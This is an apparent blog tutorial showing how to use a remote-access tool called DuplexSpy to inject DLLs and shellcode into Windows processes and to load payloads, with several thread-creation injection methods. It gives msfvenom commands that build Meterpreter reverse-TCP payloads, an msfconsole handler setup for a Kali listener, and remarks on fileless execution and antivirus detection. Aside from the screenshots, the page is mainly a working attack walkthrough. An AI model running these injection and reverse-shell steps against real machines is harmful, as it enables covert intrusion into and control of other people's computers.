<!DOCTYPE html><html lang="en-us" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>[DuplexSpy] DLL and Shellcode Injection and Loader | ISSAC/iss4cf0ng's blog</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":true,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"copy","copyFinish":"copied","expand":"expand"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><script src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.6.1/MathJax.js"></script><script>MathJax.Hub.Config({
 menuSettings: {
   zoom: "None"
 },
 showMathMenu: false,
 jax: ["input/TeX","output/CommonHTML"],
 extensions: ["tex2jax.js"],
 TeX: {
   extensions: ["AMSmath.js","AMSsymbols.js"],
   equationNumbers: {
     autoNumber: "AMS"
   }
 },
 tex2jax: {
   inlineMath: [["\\(", "\\)"]],
   displayMath: [["\\[", "\\]"]]
 }
});</script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/brands.min.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/fontawesome.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}
@font-face {
 font-family: 'Font Awesome 6 Brands';
 src: local('Font Awesome 6 Brands'), url('/lib/fontawesome/fa-brands.woff2') format('woff2');
}
@font-face {
 font-family: 'Font Awesome 6 Free';
 src: local('Font Awesome 6 Free'), url('/lib/fontawesome/fa-regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
  --light-background: url('/img/bk.jpg');
}</style><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="ISSAC/iss4cf0ng's blog" type="application/atom+xml">
</head><body><div class="loading" style="opacity: 0"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn hide"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/About/"><span class="navItemTitle">About</span></a></li><li class="navItem"><a class="navBlock" href="/Alien/"><span class="navItemTitle">Alien</span></a></li><li class="navItem"><a class="navBlock" href="/2026/01/28/2026-1-28-ToolsDuplexSpy-v2-0-0/"><span class="navItemTitle">DuplexSpy</span></a></li><li class="navItem"><a class="navBlock" href="/Notes/"><span class="navItemTitle">Notes</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>[DuplexSpy] DLL and Shellcode Injection and Loader</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2026-02-03T12:18:07.000Z" id="date"> 2026-02-03</time></div></span><br><span>Last Update: <div class="control"><time datetime="2026-02-18T06:32:36.262Z" id="updated"> 2026-02-18</time></div></span><br><span>Word Count: <div class="control">553</div></span><br><span>Read Time: <div class="control">3 min</div></span></div></div><hr><div id="post-content"><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>This article demonstrates how to use the DLL and shellcode injection features of DuplexSpy.</p>
<p>This feature allows you to inject a DLL or shellcode into a target process. DuplexSpy also provides a DLL loader and a shellcode loader, which allows you to execute payloads without injecting them into an existing process.</p>
<p>If you would like to learn more about DLL and shellcode injection techniques, you can refer to the notes I wrote for studying <a href="https://iss4cf0ng.github.io/2026/01/04/2026-1-4-BookReverseEngineeringCore/#Chapter-21-Windows-Message-Hooking">reverse engineering</a> and <a href="https://iss4cf0ng.github.io/2026/01/02/2026-1-2-NoteWindowsBufferOverflow/">Windows buffer overflow</a>.</p>
<h1 id="Injector"><a href="#Injector" class="headerlink" title="Injector"></a>Injector</h1><p>This features allows you to inject a DLL file or shellcode in a specified process. However, due to Windows security protections, this method may not always work.</p>
<p>Note that the DLL file or shellcode must match the architecture of the target process (x86 or x64). An x86 process canoot load an x64 DLL or shellcode, and vice versa.</p>
<p>DuplexSpy provides the following injection methods for both DLL and shellcode:</p>
<ul>
<li><strong>APC</strong></li>
<li><strong>Early Bird</strong></li>
<li><strong>CreateRemoteThread (default)</strong></li>
<li><strong>NtCreateThreadEx</strong></li>
<li><strong>ZwCreateThreadEx</strong></li>
</ul>
<p>Before performing an injection, you should determine the architecture of the target process. An x86 DLL cannot be injected into an x64 process, and vice versa. On x64 systems, PE files uder <code>C:\Windows\System32</code> are typically x64 binaries, while PE files under <code>C:\Windows\SysWOW64</code> are x86 binaries.</p>
<p align="center" class='item-img' data-src='/images/article/tools/duplexspy/injector/1.png'><img src="/images/article/tools/duplexspy/injector/1.png" width="400">
</p>

<h1 id="Getting-Started"><a href="#Getting-Started" class="headerlink" title="Getting Started"></a>Getting Started</h1><h2 id="DLL-Injection"><a href="#DLL-Injection" class="headerlink" title="DLL Injection"></a>DLL Injection</h2><p>Notice that this method <strong>IS NOT</strong> fileless. A DLL file will be created under <code>%TEMP%</code> directory and might be detected or deleted by antivirus software.</p>
<p>The <code>CreateRemoteThread</code> method is recommended for DLL injection.</p>
<p>In this example, Kali Linux is used to establish a <strong>Meterpreter</strong> reverse TCP connection via DLL injection.</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>Field</th>
<th>Value</th>
</tr>
</thead>
<tbody>
<tr>
<td>Target process</td>
<td><code>C:\Windows\SysWOW64\notepad.exe</code></td>
</tr>
<tr>
<td>Kali host</td>
<td>192.168.1.192</td>
</tr>
<tr>
<td>Kali port</td>
<td>4444</td>
</tr>
</tbody>
</table>
</div>
<p>Build an <strong>x86</strong> payload using <strong>msfvenom</strong>:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">$ msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.192 lport=4444 -a x86 -f dll &gt; x86.dll<br></code></pre></td></tr></table></figure></p>
<p><strong>Msfconsole:</strong><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">$ msfconsole<br>msf&gt; use exploit/multi/handler<br>msf&gt; set payload windows/meterpreter/reverse_tcp<br>msf&gt; set lhost 192.168.1.192<br>msf&gt; set lport 4444<br>msf&gt; run<br></code></pre></td></tr></table></figure></p>
<p align="center" class='item-img' data-src='/images/article/tools/duplexspy/injector/msf.1.png'><img src="/images/article/tools/duplexspy/injector/msf.1.png" width="600">
</p>

<h3 id="CreateRemoteThread"><a href="#CreateRemoteThread" class="headerlink" title="CreateRemoteThread"></a>CreateRemoteThread</h3><p>Let’s try the <strong>CreateRemoteThread</strong> method:</p>
<p align="center" class='item-img' data-src='/images/article/tools/duplexspy/injector/dll.1.png'><img src="/images/article/tools/duplexspy/injector/dll.1.png" width="600">
</p>

<p align="center" class='item-img' data-src='/images/article/tools/duplexspy/injector/dll.2.png'><img src="/images/article/tools/duplexspy/injector/dll.2.png" width="600">
</p>

<p align="center" class='item-img' data-src='/images/article/tools/duplexspy/injector/dll.3.png'><img src="/images/article/tools/duplexspy/injector/dll.3.png" width="600">
</p>

<p>Notice that the log messages in the box are not always reliable. A DuplexSpy payload cannot check your msf payload!</p>
<p>Next, exit your meterpreter session:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">meterpreter&gt; exit<br></code></pre></td></tr></table></figure></p>
<p>Process <code>notepad.exe</code> is still running!</p>
<h3 id="NtCreateThreadEx"><a href="#NtCreateThreadEx" class="headerlink" title="NtCreateThreadEx"></a>NtCreateThreadEx</h3><p><strong>NtCreateThreadEx</strong> method:</p>
<p align="center" class='item-img' data-src='/images/article/tools/duplexspy/injector/dll.4.png'><img src="/images/article/tools/duplexspy/injector/dll.4.png" width="600">
</p>

<p>It works again ( . 3 .)</p>
<p align="center" class='item-img' data-src='/images/meme/nagisa_neko.png'><img src="/images/meme/nagisa_neko.png" width="400">
</p>

<h3 id="ZwCreateThreadEx"><a href="#ZwCreateThreadEx" class="headerlink" title="ZwCreateThreadEx"></a>ZwCreateThreadEx</h3><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/injector/dll.5.png'><img src="/images/article/tools/duplexspy/injector/dll.5.png" width="600">
</p>

<h2 id="Shellcode-Injection"><a href="#Shellcode-Injection" class="headerlink" title="Shellcode Injection"></a>Shellcode Injection</h2><p>This method is fileless.</p>
<p>The <code>CreateRemoteThread</code> method is recommended for shellcode injection.</p>
<p>Use the following command to generate a meterpreter shellcode:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">msfvenom -p windows/meterpreter/reverse_tcp -a x86 -f c<br></code></pre></td></tr></table></figure></p>
<p>Paste the output into the shellcode editor of DuplexSpy.</p>
<p align="center" class='item-img' data-src='/images/article/tools/duplexspy/injector/sc.5.png'><img src="/images/article/tools/duplexspy/injector/sc.5.png" width="600">
</p>

<p>Click the “Formatting” button at the top of the window form. You can also click the “Save” button, DuplexSpy automatically runs the “Formatting” function.</p>
<p align="center" class='item-img' data-src='/images/article/tools/duplexspy/injector/sc.6.png'><img src="/images/article/tools/duplexspy/injector/sc.6.png" width="600">
    <figcaption>
    Formatting
    </figcapton>
</p>

<h3 id="CreateRemoteThread-1"><a href="#CreateRemoteThread-1" class="headerlink" title="CreateRemoteThread"></a>CreateRemoteThread</h3><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/injector/sc.1.png'><img src="/images/article/tools/duplexspy/injector/sc.1.png" width="600">
</p>

<h3 id="NtCreateThreadEx-1"><a href="#NtCreateThreadEx-1" class="headerlink" title="NtCreateThreadEx"></a>NtCreateThreadEx</h3><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/injector/sc.2.png'><img src="/images/article/tools/duplexspy/injector/sc.2.png" width="600">
</p>

<h3 id="ZwCreateThreadEx-1"><a href="#ZwCreateThreadEx-1" class="headerlink" title="ZwCreateThreadEx"></a>ZwCreateThreadEx</h3><p>Lastly, let’s try the <strong>ZwCreateThreadEx</strong> method. </p>
<p align="center" class='item-img' data-src='/images/article/tools/duplexspy/injector/sc.3.png'><img src="/images/article/tools/duplexspy/injector/sc.3.png" width="600">
</p>

<p align="center" class='item-img' data-src='/images/article/tools/duplexspy/injector/sc.4.png'><img src="/images/article/tools/duplexspy/injector/sc.4.png" width="600">
</p>

<h2 id="Loader"><a href="#Loader" class="headerlink" title="Loader"></a>Loader</h2><p>DuplexSpy allows you to load a DLL file or shellcode directly without injecting it into an existing process. As with injection, the payload architecture must match the loader architecture (x86 or x64).</p>
<p>For performance reasons, DuplexSpy creates a new process for both DLL and shellcode loading. This behavior is similar to the fileless execution features of DuplexSpy; however, the loader architecture cannot be selected manually. If the DuplexSpy payload is x64, only x64 DLLs or shellcodes can be loaded.</p>
<p align="center" class='item-img' data-src='/images/article/tools/duplexspy/loader/1.svg'><img src="/images/article/tools/duplexspy/loader/1.svg" width="800">
</p>

<h3 id="DLL-Loader"><a href="#DLL-Loader" class="headerlink" title="DLL Loader"></a>DLL Loader</h3><p>Note that this method is not fileless. </p>
<p align="center" class='item-img' data-src='/images/article/tools/duplexspy/loader/dll.1.png'><img src="/images/article/tools/duplexspy/loader/dll.1.png" width="600">
</p>

<p align="center" class='item-img' data-src='/images/article/tools/duplexspy/loader/dll.2.png'><img src="/images/article/tools/duplexspy/loader/dll.2.png" width="600">
</p>

<h3 id="Shellcode-Loader"><a href="#Shellcode-Loader" class="headerlink" title="Shellcode Loader"></a>Shellcode Loader</h3><p>DuplexSpy allows you to load shellcode into memory. It is a fileless method.</p>
<p align="center" class='item-img' data-src='/images/article/tools/duplexspy/loader/shellcode.1.png'><img src="/images/article/tools/duplexspy/loader/shellcode.1.png" width="600">
</p>

<p align="center" class='item-img' data-src='/images/article/tools/duplexspy/loader/shellcode.2.png'><img src="/images/article/tools/duplexspy/loader/shellcode.2.png" width="600">
</p>

<p align="center" class='item-img' data-src='/images/article/tools/duplexspy/loader/shellcode.3.png'><img src="/images/article/tools/duplexspy/loader/shellcode.3.png" width="600">
</p>

<h1 id="THANKS-FOR-READING"><a href="#THANKS-FOR-READING" class="headerlink" title="THANKS FOR READING!"></a>THANKS FOR READING!</h1><p align="center" class='item-img' data-src='/images/meme/nagisa_neko.png'><img src="/images/meme/nagisa_neko.png" width="400">
</p><div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2026/02/03/2026-2-3-DuplexSpyPlugin/">← Next [DuplexSpy] Using and Developing a Plugin.</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2026/01/28/2026-1-28-ToolsDuplexSpy-v2-0-0/">[Tools] DuplexSpy v2.0.0 Prev →</a></div></div></div></div><div class="bottom-btn"><div><a id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧</a><a id="to-index" href="#toc-div" title="To Catalog">≡</a><a id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://avatars.githubusercontent.com/u/110074064?v=4" alt="Logo"></a><h1 id="Dr"><a href="/">ISSAC</a></h1><div id="description"><p>Everything is failing...</p></div><div id="social-links"><a class="social" target="_blank" rel="noopener" href="https://github.com/iss4cf0ng"><i class="GitHub" alt="GitHub"></i></a></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Introduction"><span class="toc-number">1.</span> <span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Injector"><span class="toc-number">2.</span> <span class="toc-text">Injector</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Getting-Started"><span class="toc-number">3.</span> <span class="toc-text">Getting Started</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#DLL-Injection"><span class="toc-number">3.1.</span> <span class="toc-text">DLL Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CreateRemoteThread"><span class="toc-number">3.1.1.</span> <span class="toc-text">CreateRemoteThread</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NtCreateThreadEx"><span class="toc-number">3.1.2.</span> <span class="toc-text">NtCreateThreadEx</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ZwCreateThreadEx"><span class="toc-number">3.1.3.</span> <span class="toc-text">ZwCreateThreadEx</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Shellcode-Injection"><span class="toc-number">3.2.</span> <span class="toc-text">Shellcode Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CreateRemoteThread-1"><span class="toc-number">3.2.1.</span> <span class="toc-text">CreateRemoteThread</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NtCreateThreadEx-1"><span class="toc-number">3.2.2.</span> <span class="toc-text">NtCreateThreadEx</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ZwCreateThreadEx-1"><span class="toc-number">3.2.3.</span> <span class="toc-text">ZwCreateThreadEx</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Loader"><span class="toc-number">3.3.</span> <span class="toc-text">Loader</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#DLL-Loader"><span class="toc-number">3.3.1.</span> <span class="toc-text">DLL Loader</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Shellcode-Loader"><span class="toc-number">3.3.2.</span> <span class="toc-text">Shellcode Loader</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#THANKS-FOR-READING"><span class="toc-number">4.</span> <span class="toc-text">THANKS FOR READING!</span></a></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {code.findCode();
document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script><script src="/js/slide.js"></script></body></html>